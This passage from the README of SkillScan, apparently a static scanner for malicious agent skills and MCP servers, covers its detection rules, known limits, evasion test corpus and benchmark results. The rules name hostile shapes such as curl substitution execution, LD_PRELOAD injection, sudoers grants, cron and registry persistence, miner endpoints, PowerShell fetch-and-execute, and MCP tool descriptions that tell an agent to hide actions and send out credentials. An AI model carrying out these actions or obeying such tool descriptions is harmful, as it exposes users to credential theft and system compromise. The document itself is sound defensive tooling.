| SUBSTITUTION_EXEC | block / caution | Executes a download via shell substitution: `$(curl …)`, backtick curl/wget, `<(curl …)` (BLOCK in code files). A substitution that only captures the download into a variable that is never executed — e.g. a Makefile `$(shell …)` assignment — is CAUTION, and so is the executing form shown inside documentation, where it is a code-fence example rather than code that runs (v0.4 precision fix) |
| ENV_INJECTION | caution | Touches `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PYTHONSTARTUP`, or writes a fixed-name file under `/tmp` and makes it executable or runs it |
| ENV_INJECTION_INSTALL | block | An install-time or server-start context (npm lifecycle script, `setup.py`, MCP manifest env, a `.pth` startup file) sets `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PYTHONSTARTUP` / (install contexts) `PYTHONPATH`, or a `.pth` file carries an `import` line |
| SCAN_INCOMPLETE | caution | Some content could not be scanned, or nothing was scanned — the verdict is partial. Includes compiled code with no inspectable source: a `.pyc` with no matching `.py`, or a native binary in a folder with no source at all |
| CLAIM_CONTRADICTED | caution | The skill's own SKILL.md claims it does not do something (no network, read-only, no credential access, no command execution, no persistence) that the scan found it doing — see the report's "Says vs does" section. Conditional claims ("can optionally…") are disclosures and never fire |
| CLAIM_EXFIL_CONTRADICTION | block | A no-network or no-credential claim in SKILL.md contradicted by the exfiltration shape itself (credential material plus a send channel): the description denies the exact behaviour the scan proved |
| MCP_DESCRIPTION_INSTRUCTION | caution | An MCP tool description steers the agent beyond the tool's own function: cross-tool preference ("always use this tool instead of…"), instruction overrides, or a credential store named inside an instruction |
| MCP_DESCRIPTION_POISONING | block | The tool-poisoning shape in an MCP tool description: it tells the agent to keep actions hidden from the user, or to read a credential store (SSH keys, `.env`, credential files) and pass its contents along |
| INJECTION_EXECUTION | block | Promotion combination — the one promotion that ships: a temp-path injection point (`ENV_INJECTION` from the dedicated temp-path matchers — code or prose staging a file at a fixed temp path tied to execution, where the finding's line names no loader variable) **and** an execution or download-and-run surface in the same file — write to a world-writable staging path and run it. Loader-variable assignments do not count: they stay `ENV_INJECTION` at caution |
| INSTALL_FROM_BARE_IP | block | An install command resolves its package from a bare **public** IPv4 host (a direct URL, or an index/registry option) — private, loopback, link-local and other non-global ranges never fire; named mirrors stay `INSTALL_FROM_URL` cautions |
| SETUID_CHMOD | block | Sets the setuid/setgid bit — strict forms only: an octal mode carrying the setuid/setgid digit, symbolic `+s`, `os.chmod` with such a mode, `install -m` |
| SUDOERS_GRANT | block | A strict NOPASSWD sudo grant line, or grant content written to `/etc/sudoers` or `/etc/sudoers.d` — a bare path mention never fires |
| SUDO_GROUP_GRANT | block | Adds a user to the sudo/wheel group (`usermod -aG sudo`, `gpasswd`, `adduser` / `useradd` forms) |
| SITECUSTOMIZE_WRITE | block | Writes `sitecustomize` / `usercustomize` into a site-packages or startup location — code Python runs at every interpreter start |
| SCHTASKS_CREATE | block | Creates a Windows scheduled task (`schtasks /create` — `/run` and `/change` are not the creation form) |
| CRON_PATH_WRITE | block | A write anchored to a cron location's own statement, or a crontab install form — reads and listings never fire |
| STARTUP_FOLDER_WRITE | block | A write whose target is a Windows Startup folder |
| REGISTRY_RUN_WRITE | block | Writes a value under a `CurrentVersion\Run` / `RunOnce` registry key — set verbs only; deletions, exports and reads never fire |
| MINER_BINARY_CONTEXT | block | A known miner binary in command/delivery position, or beside a pool endpoint in the same statement — a bare name in a detector's list does not fire |
| STRATUM_ENDPOINT | block | A stratum mining-pool endpoint literal (`stratum+tcp/ssl://`, `stratum2+…`) — the literal's only function is a pool connection |
| POWERSHELL_REMOTE_EXEC | block / caution | PowerShell fetch-and-execute: `iex` applied to a web request, or an execution-linked `DownloadString` / `DownloadData` — BLOCK on script surfaces, CAUTION in documentation (the `CURL_PIPE_BASH` doctrine); a bare download never fires |

Every rule ships with a plain-English reason in the report, so a
non-specialist can understand *why* something was flagged.

## What this is not

SkillScan is a **linter, not a guarantee of safety**.

- A **PASS** means "no known-bad patterns were found in the files that
  were scanned" — not "this skill is safe".
- A **BLOCK** means a pattern strongly associated with malicious skills
  was found — read the finding before judging; context matters.
- SkillScan does not run the skill, does not sandbox anything, and does
  not replace reading the code of anything you install with broad
  permissions.

### Known limits (kept honest, from adversarial review)

SkillScan v0 was reviewed by three independent adversarial reviewers
(red-team evasion, false-positive hunting, code/scope audit). The first
version failed badly — 0 of 17 evasion mutations got a BLOCK, and benign
skills were BLOCKed by their own safety documentation. Those defects
were fixed (see the test suites below). What **still** evades or
challenges it, by design of static analysis:

- **Runtime behaviour is invisible.** Code that decides what to do from
  a server response, the date, or an encrypted config can look clean.
- **Strong encryption / packing** of a payload (beyond base64/hex) is
  flagged at most as obfuscation, not decoded.
- **JS/TS is regex + string-squeezing, not a full AST** — deeply dynamic
  JS (computed property access, `eval` of assembled strings via indirect
  routes) can still slip through.
- **Multi-file dataflow** is shallow: a credential read in one file and
  a send in another are combined at skill level (`EXFIL_COMBINATION`),
  but value-level taint tracking across files is not done. A dedicated
  scoping of the 239 code-bearing skills that currently PASS found no
  split chains to join — the halves are absent, not unjoined — so a
  cross-file dataflow engine is parked, not planned (see "What
  remains open").
- **CAUTION is noisy by design** for capability flags: a backup tool
  *should* be flagged for subprocess + deletion, a weather skill for
  network + an env API key. `expanduser()` on a user-supplied path is
  currently flagged as home access — a known over-broad caution.
- **Measured combinations that were NOT promoted.** Several
  CAUTION pairs were measured as possible promotions and
  deliberately left at CAUTION, because each has a legitimate
  twin the scanner cannot tell apart at line level: a
  loader-variable assignment (home installs, helper-built and
  config-driven values are mainstream), disclosure prose plus
  store-grade secret access (vault managers and backup tools
  move the user's own credentials to the user's own
  destination as their job), and concealment plus execution
  (user-data decoders, shipped sample blobs and PEM material
  look like payload decoding; hidden protective instructions
  are agent-addressed by design). The broad capability
  pairs (network + subprocess, chmod + subprocess) were
  priced against code-bearing benign skills and trip
  mainstream honest tools (checksum-verified installers,
  permission fixers), and a shell-string narrowing of those
  pairs — built and measured at +147 — was parked after
  adversarial review built honest shell-string users
  (build runners, media tools, test harnesses) that it
  blocked wholesale. Correctness over coverage:
  a combination is promoted only when it is a completed chain
  with no mainstream benign twin — currently that is only the
  temp-path `INJECTION_EXECUTION` shape above.
- **Unpinned installs stay CAUTION.** Installing a named
  package without a version pin, from a named host over
  plain http, or from a custom index is ordinary setup
  for mainstream tools — the unpinned-install shape alone
  trips 380 benign corpus skills — so those stay with
  `RUNTIME_PACKAGE_INSTALL` / `INSTALL_FROM_URL` at
  CAUTION. What BLOCKs is the shape with no honest
  mainstream twin: an install resolved from a bare
  public IP address (`INSTALL_FROM_BARE_IP`).
- **Dual-use primitives are not blocked on shape alone.**
  A priced `dd` disk-fill rule was built, measured and
  removed: `dd if=/dev/zero` writing a disk image, a swap
  file or a LUKS keyfile is syntactically identical to
  disk-fill abuse, and no deterministic separator exists.
  The same line is why disclosed setuid chmods, sudo-group
  grants and scheduled-task creation *do* BLOCK — they
  sit in the disclosed-privilege / persistence stance
  family this scanner already applies — while an exported
  `.reg` file used as test data BLOCKs under
  `REGISTRY_RUN_WRITE`: it is byte-identical to an
  importable installer `.reg`, and no deterministic
  separator exists there either. PowerShell
  fetch-and-execute shown in documentation is CAUTION,
  not BLOCK — the documentation severity doctrine the
  scanner already applies to `CURL_PIPE_BASH`; on script
  surfaces it BLOCKs.
- **Secret detection is heuristic.** The live-format tier needs the
  complete token in one place; the generic tier's regex floor is an
  8-character value, but its entropy requirement (≥3.5 bits per
  character over at least 6 distinct characters) puts the *effective*
  minimum at roughly 12 characters — so short, weak, split or encoded
  secrets evade it, and a random-looking *test* value can trip the
  CAUTION tier. Live-format values in test files or next to FAKE_ /
  FIXTURE markers are downgraded to CAUTION, not blocked. Placeholders
  and marked examples are suppressed, but suppression is substring-based.
- **Metadata / reverse-shell rules are shape-based.** A metadata
  endpoint reached through a resolved hostname or non-standard path, or
  a socket shell wired in an unusual way, can evade them.
- **MCP coverage is structural for common manifest shapes** (`tools[]`,
  `mcpServers`) — exotic manifest layouts may only get text-level rules.
- **Scan budgets are finite.** A scan stops after 2,000 files or 32 MB
  of content (per-file cap 2 MB), and lines are matched after truncation
  at 100,000 characters. Hitting a budget is reported as a suspicious
  skip and forces `SCAN_INCOMPLETE`, so a huge folder degrades to
  CAUTION — never to a silent PASS and never to a hang.
- **Concealment and phrase checks are mechanics, not meaning.**
  `HIDDEN_TEXT` / `MARKDOWN_CONCEALMENT` detect invisible characters
  and hidden elements; `NON_ENGLISH_INSTRUCTION` matches a fixed
  phrase list in 14 languages. None of them understands what prose
  *means*: a novel phrasing, an uncovered language, or a purely
  semantic deception still passes — see the coverage map's Gap B.
  Ordinary multilingual text is deliberately protected (single
  zero-width joiners in Persian/Indic/emoji contexts do not fire), so
  the trade is recall, not false alarms on real-world text.

### Scanner hardening

SkillScan reads untrusted folders, so the scanner itself is treated as
an attack surface (`run_security_tests.py` covers this): symlinks are
never followed, special files (FIFOs, sockets) are skipped rather than
opened, archives are **never extracted**, and a hostile folder cannot
crash the CLI into a traceback — scan failures exit with code 3.
Text and Markdown reports escape control characters from scanned file
names and content, so a malicious folder cannot inject ANSI escapes or
forge report lines in your terminal (JSON output is escaped by its
encoding). To report a vulnerability in SkillScan itself, see
[SECURITY.md](SECURITY.md) — please use GitHub's private vulnerability
reporting, not a public issue.

## Test corpus

`samples/` and `samples-mutations/` contain simulated skills that exist
**only to be scanned — never run them**. Every sample in v0.1 is
**simulated or mutation-based**, written for this project. **Audit-derived
sample files are not included in v0.1** — instead of recreating real
attack samples, [`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps
the techniques from published audits to the rules below and states,
technique by technique, what is covered and what is not.

| Corpus | Contents | Expected |
|--------|----------|----------|
| `samples/good/` (2) | Benign skills reading files in their own folder | PASS (exit 0) |
| `samples/bad/` (2) | SSH-key stealer; base64 dropper + `curl \| bash` | BLOCK (exit 2) |
| `samples/caution/` (1) | Legit-sounding backup skill using `subprocess` + file deletion | CAUTION (exit 1) |
| `samples-mutations/` (17) | The stealer/dropper/manifest rewritten with evasion techniques: string concatenation, pathlib joins, `importlib`/`getattr`, alias imports, `chr()` codes, chunked base64, JS `fetch`, shell variables, glob discovery, GET-param exfil, PowerShell payload, UTF-16 encoding, unrestricted MCP manifest | BLOCK (exit 2), every one |

Run the suites with:

```bash
python3 run_tests.py           # shipped samples
python3 run_mutation_tests.py  # 17 evasion mutations — all must BLOCK
python3 run_edge_tests.py      # FIFO hang, oversize, empty, usage codes, UTF-16
python3 run_security_tests.py  # hostile folders vs the scanner itself (see below)
python3 run_v02_tests.py       # v0.2: secrets, metadata, browser stores, reverse shells, error leaks, npm/PyPI targets, Cursor rules, repo URLs, SARIF, Action + hook (fixtures are inert and built in a temp dir)
python3 run_v03_tests.py       # v0.3: hidden text (zero-width/Tags/BiDi/comments), non-English instruction phrases, Markdown concealment, substitution exec, session sends, bytecode honesty, env injection, OWASP metadata (fixtures are inert and built in a temp dir)
python3 run_v04_tests.py       # v0.4: dependency sources (off-registry manifests, install-execution combination), JS http/https + download-and-run, install-prose refinement (named-registry docs pass, URL installs flag), substitution documentation cap, directive-comment recalibration, prose download-run chain, read-and-disclose combination (fixtures are inert and built in a temp dir)
python3 run_v04fix_tests.py    # v0.4 fix pass: scanner-DoS perf shapes, inert-text (comment/string) precision, routine-lifecycle + same-package combination scoping, urllib.parse classification, and one regression case per adversarial-review evasion (fixtures are inert and built in a temp dir)
python3 run_v05_tests.py       # v0.5: prose fetch-execute / pipe / read-send chains + safety-bypass lure, output-manipulation + prompt-manipulation phrases on instruction surfaces, taint-lite (credential flow to sends), offline typosquat + its harvested-name validation gate (fixtures are inert and built in a temp dir)
python3 run_v05fix_tests.py    # v0.5 fix pass: scope-aware flow-sensitive taint (no BLOCK on a name collision), lure proximity + framing suppression, guard-laundering closures, output-manipulation frame scoping, typosquat manifest extraction (bare names, setup.py, homoglyphs), one regression case per adversarial-review finding (fixtures are inert and built in a temp dir)
python3 run_v06_tests.py       # v0.6: agent-config poisoning — silent writes/registrations into global agent configs BLOCK, agent credential-store reads BLOCK and flow into the exfil combinations, user-mediated prose at CAUTION, own-folder/project-local configs never flagged (fixtures are inert and built in a temp dir)
python3 run_v06fix_tests.py    # v0.6 fix pass: mediation demotion (prompt/flag-gated config writes at CAUTION), real-read discipline (exists/stat probes never count), direction-aware writes, stale-binding kills, red-team evasion closures, matcher timing bombs (fixtures are inert and built in a temp dir)
python3 run_v06fix2_tests.py   # v0.6 fix wave 2: demotion hardening (code-only signals, called helpers, guarding shell prompts, delete-only disqualifiers, flag polarity/tautology), folder-aware mediation, widened primitives (JS prompts, GUI dialogs, Ruby gets), ../. resolution, dd/tar/unzip + batch/helper credential reads, tilde-user writes, audit-2 perf shapes + stale-token fix, four timed bomb shapes (fixtures are inert and built in a temp dir)
```

## Coverage against published audits

[`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps 25 techniques
from four published audits of real malicious skills / MCP servers
against the 76 rules above. Summary (Covered / Partial / Gap per audit):

| Audit | Covered | Partial | Gap |
|-------|---------|---------|-----|
| Snyk — ToxicSkills, Feb 2026 (3,984 skills scanned) | 3 | 5 | 3 |
| Koi Security — ClawHavoc, Feb 2026 (341 malicious skills) | 1 | 4 | 2 |
| Invariant Labs — MCP Tool Poisoning, Apr 2025 | 0 | 2 | 2 |
| Koi Security — postmark-mcp backdoor, Sep 2025 | 0 | 2 | 1 |
| **Total (25 techniques)** | **4** | **13** | **8** |

The honest pattern: SkillScan is strong on the *code-shaped* half of
these audits (credential reads, network exfiltration, decode-and-run
droppers) and weak on the *language-shaped* half (deceptive instructions
in prose or MCP tool descriptions, rug pulls, registry-level tricks) —
several of which no static folder scanner can see. The map gives the
per-technique reasoning and the test-suite evidence (or the lack of it)
for every cell. Read it before trusting a PASS.

Each suite scans samples as subprocesses, asserts verdicts and exit
codes, and exits non-zero on any failure.

## Benchmarks

SkillScan's own measured rates on a public labelled corpus —
**MaliciousSkillBench** (9,740 labelled skills: 7,505 malicious,
2,235 benign), pinned at GitHub commit
`893afd609be22a2dfac5a2b94bbebb4eeb99515e` and Hugging Face
revision `d4b42ce5766a6e0359c987cf59c1007cb3795a90`. First run
2026-11-11 with SkillScan v0.6.0; re-run 2026-11-19 with the
current tree (76 deterministic rules, including the
gap-wave rules described below) — the figures below are
that run, made with the deterministic offline mode only
(no `--llm`). Malicious skills were scanned as
complete extracted folders; benign skills are shipped by the
benchmark as frozen text, so each was scanned as a single
`SKILL.md` folder. Nothing was executed — folders were read as
text only. Full methodology, counting rules and caveats:
[`docs/BENCHMARKS.md`](docs/BENCHMARKS.md).

| Set | Skills | BLOCK | CAUTION | PASS |
|-----|--------|-------|---------|------|
| Malicious | 7,421 | **54.2%** (4,019) | 28.3% (2,097) | 17.6% (1,305) |
| Benign | 2,235 | 0% false BLOCKs (0) | 24.7% (551) | 75.3% (1,684) |

Detection at BLOCK+CAUTION (flagged at any severity): **82.4%**
(6,116 of 7,421) of malicious skills; 24.7% of benign skills
were flagged at any severity, all as CAUTION. Median scan time
was ~106 ms per malicious skill (p95 ~600 ms) and ~44 ms per
benign skill.

Detection by attack family (multi-label membership; BLOCK /
BLOCK+CAUTION). The BLOCK column is the 2026-11-19 run;
BLOCK+CAUTION is unchanged from the v0.8.0 run except for
one skill (see the fix wave below), because the promotion
and the gap wave only moved skills that were already
flagged:

| Family | Skills | BLOCK | BLOCK+CAUTION |
|--------|--------|-------|---------------|
| Privilege / tool-authority abuse | 1,004 | 88.5% | 99.4% |
| Execution / code delivery | 3,205 | 83.1% | 97.9% |
| Credential access | 197 | 55.3% | 95.9% |
| Persistence / control | 249 | 68.3% | 90.0% |
| Instruction / goal manipulation | 1,560 | 72.1% | 86.2% |
| Data exfiltration / disclosure | 266 | 35.3% | 83.8% |
| Resource / availability abuse | 330 | 46.4% | 90.3% |
| Dependency / supply chain | 167 | 77.2% | 87.4% |
| Defense evasion / obfuscation | 20 | 10.0% | 100% |
| Integrity / output manipulation | 97 | 2.1% | 28.9% |
| Discovery / reconnaissance | 5 | 20.0% | 20.0% |
| (No category assigned) | 2,591 | 30.3% | 67.5% |

### What moved in this run (2026-11-19)

Twelve new deterministic BLOCK rules (the gap wave — see
"What remains open"). 330 malicious skills moved from
CAUTION to BLOCK, every transition attributed to a new
rule; nothing else moved: the PASS count is identical
(1,305), BLOCK+CAUTION is unchanged at 82.4% because every
gain upgraded a skill that was already flagged, and the
benign side is verdict-identical (0 / 551 / 1,684 — four
benign folders gain a CAUTION-severity PowerShell finding,
verdicts unchanged). The dependency / supply-chain
family's BLOCK rate rose 14.4% → 77.2%. The priced shapes
that trip mainstream honest tools (unpinned named installs
above all) were not built, and one built rule (`dd`
disk-fill) was removed as dual-use — see Known limits.

### What moved in this run (2026-11-15)

One change moved the numbers: the `INJECTION_EXECUTION`
promotion. 297 malicious skills moved from CAUTION to BLOCK —
every one a completed staging chain (a file written to a
fixed temp path and tied to execution in the same file), and
every transition is attributed to that one rule. Nothing else
changed: PASS counts are identical, the benign side is
identical (0 false BLOCKs, 557 CAUTION), and no other skill's
rule set changed. Seven other measured combinations were
**not** promoted — each has a legitimate twin the scanner
cannot tell apart (see Known limits) — so this is the whole
gain the promotion programme could honestly bank: BLOCK
45.8% → 49.8% at zero measured false-BLOCK cost on either
benign corpus (this one, and the code-bearing set described
in "What remains open").

### What the fix wave changed (2026-11-15)

The same day, three over-broad rules were tightened to
require the evidence their names claim — an SSH key path
must actually be *read* (not merely mentioned), a curl
command must carry a data flag among its *own* arguments
(a header-dump `-D` is not a send, and a `-d` belonging to
another command on the line is not curl's), and `rm -rf`
is demoted to CAUTION only when the target is a folder the
same script provably created itself. On the code-bearing
benign set this freed 14 of the 52 blocked skills (the
permission fixers, the plain downloads, the own-folder
cleanups); every remaining BLOCK there is a stated stance.
On this corpus the trade was: 34 explained BLOCK losses
(mention-only SSH hits, download-only curls, own-artefact
deletions, and exfiltration combinations whose only
credential evidence was a mention) against 27 gains from
properly tokenised multi-line curl sends — net BLOCK
3,696 → 3,689 (49.7%), one mention-only skill also dropping
from CAUTION to PASS, and benign CAUTIONs 557 → 551.
Correctness over coverage, again: the headline rate bought
with other people's false alarms is not a rate worth
printing.

### Why the numbers did not move (v0.6 → v0.8.0)

Per skill, **zero verdicts changed** between the v0.6 and
v0.8.0 runs — none stronger, none weaker — even though the new
machinery did fire. On 163 malicious and 16 benign folders the
fired rule sets differ; every new fire landed on a skill
already at that verdict or higher:

- **JavaScript/TypeScript ERROR_INFO_LEAK (v0.7.1):** fires
  rose 473 → 511 (+38, all at CAUTION severity) — 30 on skills
  already BLOCK, 8 on skills already CAUTION.
- **Claims check (v0.7.1):** contradictions reported on 129
  malicious folders (126 `CLAIM_CONTRADICTED` at CAUTION tier,
  3 `CLAIM_EXFIL_CONTRADICTION` at BLOCK tier) and 16 benign
  folders. No verdict changed: on this corpus the check
  corroborates verdicts the behaviour rules had already
  reached, which is what it is for — it reports where a skill's
  own claims disagree with the scan.
- **MCP tool-description rules (v0.8.0):** fired **0 times**
  corpus-wide. Only 693 of 7,421 malicious folders contain any
  `.json` file at all, and only 12 contain a `"tools"` key —
  the MCP tool-manifest shape the two rules inspect. This
  corpus predates MCP tool-description poisoning as a shipped
  attack shape, so this benchmark can neither confirm nor
  refute those rules; their evidence is their fixture suites
  and the repo samples.
- `--combine`, `--pin` / `--check-pin` and `--exceptions` are
  separate modes a plain folder scan never exercises, so this
  run says nothing about them either way.

Honest limits, stated plainly:

- **Most misses are prose-only skills.** 1,305 malicious
  skills still PASS; 887 of them are a single `SKILL.md` with
  no code at all. Among *pure* instruction-manipulation skills
  the BLOCK rate is 8.8%, and pure output manipulation is ~2%
  — deterministic rules see behaviour shapes, not meaning.
- **The benign side is prose-only** (see above), so the false-BLOCK
  figure measures prose-triggered false alarms, not code-triggered
  ones. That asymmetry is part of the corpus, and it is disclosed
  rather than smoothed over.
- **v0.5's gain is at CAUTION, not BLOCK.** BLOCK detection is
  unchanged from v0.4 in every labelled attack family (45.7%
  overall); BLOCK+CAUTION rose from 81.8% to 82.4% as the new prose
  chains, output-manipulation and value-flow rules flagged 47 skills
  v0.4 passed entirely. Benign false BLOCKs remain **0** on the same
  benign set; the benign flagged-at-any-severity rate rose from
  22.3% to 24.8% because the new rules also add CAUTIONs on benign
  prose. (That was the picture through v0.8.0; the first change
  since to move BLOCK is the 2026-11-15 promotion above.)

## Licence

MIT — see [LICENSE](LICENSE). Copyright (c) 2026 RakTikoo.

## Status

Current release: **v0.10.0** (2026-11-19). It carries the
gap wave — twelve new deterministic BLOCK rules (76 rules)
closing the measured supply-chain gap — on top of v0.9.0;
see the CHANGELOG. SkillScan began as a
Week 1 spike; every version since has passed the full test
suites and an independent adversarial review before it was
pushed. The short history: v0.1–v0.2 built the deterministic
rule core (live-secret detection, cloud metadata, browser
credential stores, reverse shells, SARIF output, the GitHub
Action and the pre-install hook); v0.3 added concealment
mechanics (zero-width / Unicode Tags / BiDi characters, hidden
Markdown) and non-English instruction phrases, now in 15
languages; v0.4 and v0.5 were measured fix waves against the
public MaliciousSkillBench corpus — dependency-source checks,
prose instruction chains, a small intra-file value-flow
analysis, the output-manipulation family — reaching the catch
figures in the benchmark section above at zero false BLOCKs on
the benign set; v0.6 added agent-configuration and
agent-credential-read coverage. v0.7 added the opt-in `--llm`
mode (a separate, clearly labelled second opinion; the offline
verdict is never rewritten). v0.7.1 completed ERROR_INFO_LEAK
for JavaScript/TypeScript and added the claims check — the
scanner now reads what a skill's SKILL.md claims about itself
and reports where the scan disagrees. v0.8.0 completed the
feature programme: MCP tool-description scanning (63
deterministic rules), the change watch (`--pin` /
`--check-pin`), the combination scan (`--combine`), and
exceptions with reasons (`--exceptions`) — each reviewed
adversarially before it landed, with its state tracked in
the "What remains open" block above. v0.9.0 added the one
promotion that survived measurement (`INJECTION_EXECUTION`,
temp-path kind; 64 rules) and the false-BLOCK fix wave that
tightened three over-broad rules to require the evidence
their names claim; the measured combinations that did not
survive — the broad capability pairs, the shell-string
narrowing, cross-file dataflow — are recorded as parked,
with their reasons, in the same block. v0.10.0 added the
gap wave: twelve priced deterministic rules (76 in all)
aimed at the families where measurement showed this
scanner trailing — supply chain above all — each built
only in a form with no benign trips, and one built rule
(`dd` disk-fill) removed as dual-use. Expect false positives and false negatives; the
rule set and corpus are a starting point, not a finished
product. Issues and new evasion samples are welcome — a
mutation that evades SkillScan is a valuable contribution.

---

**More from this workshop:** [KiCad Preflight](https://github.com/RakTikoo/kicad-preflight) · [Expiry Radar](https://github.com/RakTikoo/expiry-radar) · [CI Command Truth](https://github.com/RakTikoo/ci-command-truth) · [PhantomDep PR Gate](https://github.com/RakTikoo/phantomdep-pr-gate) · [Stranger Suite](https://github.com/RakTikoo/stranger-suite) · [Living Contract Diff](https://github.com/RakTikoo/living-contract-diff) · [Handoff Reconciler](https://github.com/RakTikoo/handoff-reconciler)
